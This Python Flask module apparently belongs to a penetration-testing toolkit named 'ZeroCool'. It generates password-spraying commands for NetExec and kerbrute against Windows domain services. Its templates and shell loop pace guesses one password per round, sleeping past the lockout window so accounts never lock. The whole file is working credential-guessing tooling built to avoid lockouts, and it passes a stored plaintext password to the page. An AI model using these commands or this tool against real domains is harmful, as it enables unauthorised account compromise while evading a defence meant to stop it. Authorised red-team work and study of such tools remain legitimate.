"""Password spraying with lockout safety for ZeroCool.

The dangerous part of spraying is locking out the domain. This module builds the
spray command so it stays safe:

  * one password per round (each round adds at most 1 to every account's
    badPwdCount),
  * a sleep between rounds longer than the observation window, so badPwdCount
    resets and never climbs toward the lockout threshold,
  * up-front warnings when the policy is unknown or the threshold is 1.

Fetch the policy first ('Get password policy') to read the threshold / window,
then spray with confidence.
"""

from __future__ import annotations

import shlex

from flask import Blueprint, jsonify, render_template, request

import storage

spray_bp = Blueprint("spray", __name__)

# {target}/{userlist}/{domain}/{pw} are substituted; --continue-on-success
# keeps going after the first valid hit so the whole userlist is sprayed.
TOOL_TEMPLATES = {
    "nxc_smb":   "nxc smb {target} -u {userlist} -p {pw} -d {domain} --continue-on-success",
    "nxc_ldap":  "nxc ldap {target} -u {userlist} -p {pw} -d {domain} --continue-on-success",
    "nxc_winrm": "nxc winrm {target} -u {userlist} -p {pw} -d {domain} --continue-on-success",
    "nxc_rdp":   "nxc rdp {target} -u {userlist} -p {pw} -d {domain} --continue-on-success",
    "nxc_mssql": "nxc mssql {target} -u {userlist} -p {pw} --continue-on-success",
    "kerbrute":  "kerbrute passwordspray -d {domain} --dc {target} {userlist} {pw}",
}
TOOL_LABELS = {
    "nxc_smb": "NetExec SMB", "nxc_ldap": "NetExec LDAP", "nxc_winrm": "NetExec WinRM",
    "nxc_rdp": "NetExec RDP", "nxc_mssql": "NetExec MSSQL", "kerbrute": "Kerbrute (Kerberos)",
}


def _render(tmpl, target, userlist, domain, pw):
    return (tmpl.replace("{target}", target)
                .replace("{userlist}", shlex.quote(userlist))
                .replace("{domain}", shlex.quote(domain))
                .replace("{pw}", pw))


def build_spray(p: dict, eng: dict) -> dict:
    tool = p.get("tool", "nxc_smb")
    target = (p.get("target") or eng.get("dc_ip") or "DC_IP").strip()
    domain = (p.get("domain") or eng.get("domain") or "").strip()
    userlist = (p.get("userlist") or "users.txt").strip()
    passwords = storage.parse_list(p.get("passwords", ""))

    def _int(v, d):
        try:
            return int(v)
        except (TypeError, ValueError):
            return d

    threshold = _int(p.get("threshold"), 0)        # 0 = unknown
    window = _int(p.get("window"), 30)             # observation window (minutes)
    delay = _int(p.get("delay"), 0)
    if delay <= 0:
        delay = window * 60 + 60                   # 1 min past the window

    tmpl = TOOL_TEMPLATES.get(tool, TOOL_TEMPLATES["nxc_smb"])
    warnings, plan = [], []

    if not passwords:
        passwords = ["PASSWORD"]
    if threshold == 1:
        warnings.append("Lockout threshold is 1 — any wrong guess locks the account. Do NOT spray.")
    elif threshold == 0:
        warnings.append("Lockout threshold unknown — get the password policy first; the plan assumes 1 attempt per round.")
    if not domain and tool not in ("nxc_mssql",):
        warnings.append("No domain set.")

    if len(passwords) == 1:
        command = _render(tmpl, target, userlist, domain, shlex.quote(passwords[0]))
        plan.append("Single spray — 1 attempt per user (badPwdCount += 1). Safe for any threshold ≥ 2.")
    else:
        plist = " ".join(shlex.quote(x) for x in passwords)
        inner = _render(tmpl, target, userlist, domain, '"$p"')
        command = (f'for p in {plist}; do echo "[*] spraying: $p"; {inner}; '
                   f'echo "[*] sleeping {delay}s for the lockout window to reset..."; sleep {delay}; done')
        total_min = (len(passwords) - 1) * delay // 60
        plan.append(f"{len(passwords)} passwords · 1 per round (badPwdCount += 1 per round, per user).")
        plan.append(f"Sleeping {delay}s (~{delay // 60}m) between rounds — ≥ the {window}m observation window, so "
                    "badPwdCount resets and never exceeds 1.")
        plan.append(f"~{total_min} min total — run it in the quick-terminal drawer or a tmux so it can sleep.")

    return {"command": command, "plan": plan, "warnings": warnings}


@spray_bp.route("/spray")
def spray():
    eng = storage.load_engagement()
    cred = (eng.get("credentials") or [{}])[0]
    return render_template("spray.html", eng=eng, tools=TOOL_LABELS,
                           pol_user=cred.get("username", ""), pol_pass=cred.get("password", ""))


@spray_bp.route("/spray/build", methods=["POST"])
def spray_build():
    eng = storage.load_engagement()
    return jsonify(build_spray(request.get_json(silent=True) or {}, eng))
